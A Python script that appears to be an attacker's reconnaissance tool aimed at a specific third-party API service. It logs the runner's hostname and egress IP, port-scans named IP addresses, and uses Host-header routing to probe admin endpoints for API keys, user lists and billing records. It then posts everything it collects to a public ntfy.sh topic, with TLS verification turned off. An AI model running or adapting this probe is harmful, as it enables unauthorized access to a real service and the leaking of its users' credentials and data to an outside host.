import os, sys, socket, ssl, time, json, urllib.request

TOPIC = os.environ.get("TOPIC", "i42302v-def")
CTX = ssl._create_unverified_context()
OUT = []

def log(*a):
    line = " ".join(str(x) for x in a); print(line, flush=True); OUT.append(line)

def send(tag, text):
    text = str(text)
    for i in range(0, len(text), 3000):
        body = ("[%s %d] " % (tag, i//3000+1)).encode() + text[i:i+3000].encode("utf-8","replace")
        for _ in range(3):
            try:
                urllib.request.urlopen(urllib.request.Request("https://ntfy.sh/"+TOPIC, data=body, method="POST"), timeout=15, context=CTX).read(); break
            except Exception: time.sleep(1)

def tcp(host, port, t=6):
    s=socket.socket(); s.settimeout(t); t0=time.time()
    try: s.connect((host,port)); return True, round((time.time()-t0)*1000)
    except Exception as e: return False, type(e).__name__
    finally:
        try:s.close()
        except:pass

def http(method,url,host=None,data=None,t=8,ctype="application/json"):
    h={"User-Agent":"Mozilla/5.0 probe"}
    if host:h["Host"]=host
    if data is not None and ctype:h["Content-Type"]=ctype
    body=data.encode() if isinstance(data,str) else data
    req=urllib.request.Request(url,data=body,headers=h,method=method)
    try:
        r=urllib.request.urlopen(req,timeout=t,context=CTX); raw=r.read(4000)
        return r.getcode(), dict(r.getheaders()), raw, None
    except urllib.error.HTTPError as e:
        try:raw=e.read(4000)
        except:raw=b""
        return e.code, dict(e.headers), raw, None
    except Exception as e:
        return None, {}, b"", type(e).__name__

def snip(b,n=220):
    try:s=b.decode("utf-8","replace")
    except:s=str(b)
    return " ".join(s.split())[:n]

def main():
    log("RUNNER", socket.gethostname(), time.strftime("%FT%TZ",time.gmtime()))
    try: log("EGRESS", urllib.request.urlopen("https://api.ipify.org",timeout=12,context=CTX).read().decode().strip())
    except Exception as e: log("EGRESS_FAIL", type(e).__name__)
    # confirm target still dead
    log("--- target recheck ---")
    for p in [80,443,3000]:
        ok,info=tcp("40.160.5.46",p); log("PORT","40.160.5.46",p,"OPEN" if ok else "NO:"+str(info))

    # live edges to test Host-routing toward query backend
    edges = [("http","40.160.50.80",80),("https","40.160.50.80",443),("http","40.160.50.80",3000),
             ("http","135.148.234.41",80),("https","135.148.234.41",443),("http","135.148.234.41",3000)]
    log("--- edge reachability ---")
    live=[]
    for sch,h,p in edges:
        ok,info=tcp(h,p); log("EDGE",h,p,"OPEN:"+str(info) if ok else "NO:"+str(info))
        if ok: live.append((sch,h,p))

    log("--- vhost routing: Host=query vs default ---")
    for sch,h,p in live:
        base="%s://%s:%d"%(sch,h,p)
        for host in ["query.yibuapi.com", None]:
            c,hd,raw,er=http("GET", base+"/", host=host)
            log("ROOT",base,"Host="+str(host),"code="+str(c),"len=%d"%len(raw),"srv="+str(hd.get("Server")),"err="+str(er),"body="+snip(raw,140))
        # query-specific admin endpoints under query vhost
        for path in ["/admin/tokens/queryKey?key=sk","/admin/users/listByUsername?username=&page=1&pageSize=3","/api/bill/calcDetail/list?page=1&pageSize=3"]:
            c,hd,raw,er=http("GET", base+path, host="query.yibuapi.com")
            log("QADMIN",base,path,"code="+str(c),"len=%d"%len(raw),"err="+str(er),"body="+snip(raw,200))
    send("VHOST","\n".join(OUT)); log("DONE")

main()
